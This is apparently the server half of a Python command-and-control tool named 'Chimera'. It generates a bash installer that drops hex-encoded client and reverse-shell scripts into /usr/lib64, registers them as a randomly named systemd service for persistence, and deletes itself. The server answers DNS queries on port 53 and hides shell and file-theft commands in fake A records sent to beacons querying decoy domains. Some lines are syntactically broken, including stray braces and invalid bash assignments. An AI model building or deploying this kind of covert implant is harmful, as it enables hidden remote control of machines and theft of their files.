import socket
import struct
import sys
import random
import time
import os

def createInstaller(host):
    if(os.path.exists('./client.py') and os.path.exists('./shellClient.py')):
        print("Creating installer located at ./installer.sh...")
        f = open('./client.py', 'r')
        clientConts = f.read()
        f.close()
        f = open('./shellClient.py')
        shellConts = f.read()
        f.close()
        f = open('./installer.sh', 'w')
        
        contents = """
#!/bin/bash     
CLIENTCONTS=""" + clientConts.encode().hex()} + """
SECCLIENTCONTS=""" + shellConts.encode().hex()} + """

hex=${CLIENTCONTS//[^0-9a-fA-F]/}    # strip spaces/newlines/non-hex
(( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }

decoded=""
for ((i=0; i<${#hex}; i+=2)); do
  decoded+=$(printf "\\x${hex:i:2}")
done
CLIENTCONTS=$decoded
hex=${SECCLIENTCONTS//[^0-9a-fA-F]/}    # strip spaces/newlines/non-hex
(( ${#hex} % 2 )) && { echo "odd-length hex"; exit 1; }

decoded=""
for ((i=0; i<${#hex}; i+=2)); do
  decoded+=$(printf "\\x${hex:i:2}")
done
SECCLIENTCONTS=$decoded
SERVICENAME=str=$(tr -dc 'a-z' < /dev/urandom | head -c6)

SERVICEFILE="/lib/systemd/system/"+$SERVICENAME+".service"

cat << EOFA > $SERVICEFILE
[Unit]
Description=Stuff 'n things.

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/usr/bin/python3 /usr/lib64/chimera.py "{host}"
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFA

touch /usr/lib64/chimera.py
touch /usr/lib64/shell.py

echo "$CLIENTCONTS" >> /usr/lib64/chimera.py
echo "$SECCLIENTCONTS" >> /usr/lib64/shell.py

chmod +x /usr/lib64/chimera.py
chmod +x /usr/lib64/shell.py

systemctl daemon-reload
systemctl enable "$SERVICENAME"
systemctl start "$SERVICENAME"

rm $0
"""
        f.write(contents)
        f.close()
        print("Installer creation complete. Open the installer file to view the service name as it is a length-6 string of random letters")

if (len(sys.argv) != 2):
    print("""
Usage: server.py {ip to listen on}
OR: server.py -s {ip of server}     |     This will create an install file for the current client.py and shellClient.py files. Simply transfer the install file to the remote machine and run it (as root) and it'll install Chimera
""")
    exit()
elif (sys.argv[1] == "-s"):
    createInstaller(sys.argv[2])
    exit()
else:
    LISTEN_IP = sys.argv[1]

def parse_qname(data, offset):
    qname = []
    while True:
        length = data[offset]
        if length == 0:
            offset += 1
            break
        qname.append(data[offset + 1: offset + 1 + length].decode())
        offset += 1 + length
    return ".".join(qname), offset

def build_response(query, response_ips):
    txid = query[0:2]
    flags = b'\x81\x80'  # Standard response
    qdcount = query[4:6]
    ancount = struct.pack('!H', len(response_ips))
    nscount = arcount = b'\x00\x00'

    header = txid + flags + qdcount + ancount + nscount + arcount

    qname, q_end = parse_qname(query, 12)
    question = query[12:q_end + 4]

    answers = b''
    for ip in response_ips:
        answers += (
            b'\xc0\x0c' +                 # NAME (pointer to domain name)
            struct.pack('!H', 1) +        # TYPE: A
            struct.pack('!H', 1) +        # CLASS: IN
            struct.pack('!I', 60) +       # TTL
            struct.pack('!H', 4) +        # RDLENGTH
            socket.inet_aton(ip)          # RDATA
        )

    return header + question + answers

def handleResponse(sock, query, addr, ips):
    response = build_response(query, ips)
    sock.sendto(response, addr)

def sendResponseA(sock, data, addr, command):
    handleResponse(sock, data, addr, ["" + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254)) + "." + str(command)])

def sendResponseB(sock, data, addr, destIP, destPort):
    if(int(destPort) < 256):
        value1 = str(destPort)
        value2 = "0"
    else:
        value1 = "255"
        value2 = str(int(destPort) - 255)
    handleResponse(sock, data, addr, [destIP, value1 + "." + value2 + "." + str(random.randint(1,254)) + ".3"])
    
def sendResponseC(sock, data, addr, fileName):
    addressListSplit = []
    for char in fileName:
        addressListSplit.append(ord(char))
    addressListSplit.append(3)
    
    x = 0
    y = 0
    currentAddr = ""
    addressList = []
    
    while (x < len(addressListSplit)):
        if (y == 4):
            y = 0
            addressList.append(currentAddr)
            currentAddr = ""
        currentAddr += (str(addressListSplit[x]) + ".")
            
        y = y + 1
        x = x + 1
    addressList.append(currentAddr)
    while (len((addressList[len(addressList) - 1]).split('.')) < 5):
        addressList[len(addressList) - 1] += (str(random.randint(1,254)) + ".")
        
    x = 0
    while (x < len(addressList)):
        addressList[x] = addressList[x][:-1]
        x = x + 1

    handleResponse(sock, data, addr, addressList)

def run(bind_ip=LISTEN_IP, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((bind_ip, port))
    print(f"[+] Chimera server listening on {bind_ip}:{port}")

    while True:
        data, addr = sock.recvfrom(512)
        domain, _ = parse_qname(data, 12)
        domain = domain.lower().strip('.')

        print(f"[>] Message from {addr[0]}:{addr[1]} for {domain}")
        
        if not (os.path.exists("/tmp/chimera/")):
            os.system("mkdir /tmp/chimera/")
        
        filePath = "/tmp/chimera/" + addr[0]
        if not (os.path.exists(filePath)):
            print("New beacon identified from " + addr[0] + ".")
            open(filePath, "w").close()
            
        f = open(filePath, "r")
        currentConts = f.read()
        f.close()
        contSplit = currentConts.split('\n')
        del(contSplit[0])
        
        if (domain == "supportcenter.net"): #Check-in
            sendResponseA(sock, data, addr, 100)
        elif (domain == "freegames.net"): #Heartbeat
            if(len(contSplit) >= 1):
                command = contSplit[0]
                del(contSplit[0])
                if (command == "shell"):
                    sendResponseA(sock, data, addr, 232)
                elif (command == "file"):
                    sendResponseA(sock, data, addr, 85)
            else:
                sendResponseA(sock, data, addr, 100)
        elif (domain == "securelogin.com"): #Reverse Shell
            if(len(contSplit) >= 1):
                address = contSplit[0]
                del(contSplit[0])
                addressSplit = address.split(':')
                host = addressSplit[0]
                port = addressSplit[1]
            else:
                host = "100.100.100.100"
                port = 100
            sendResponseB(sock, data, addr, host, port)
        elif (domain == "cloudlogin.com"): #Send file conts
            if(len(contSplit) > 1):
                address = contSplit[0]
                del(contSplit[0])
                addressSplit = address.split(':')
                host = addressSplit[0]
                port = addressSplit[1]
            else:
                host = "100.100.100.100"
                port = 100
            sendResponseB(sock, data, addr, host, port)
        elif (domain == "fileshare.org"): #Get filename
            if(len(contSplit) >= 1):
                fileName = contSplit[0]
                del(contSplit[0])
                sendResponseC(sock, data, addr, fileName)
            else:
                sendResponseA(sock, data, addr, 100)
            
        newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
        newCont = '\n'.join(newContSplit)
        f = open(filePath, "w")
        f.write(newCont)
        f.close()

run()
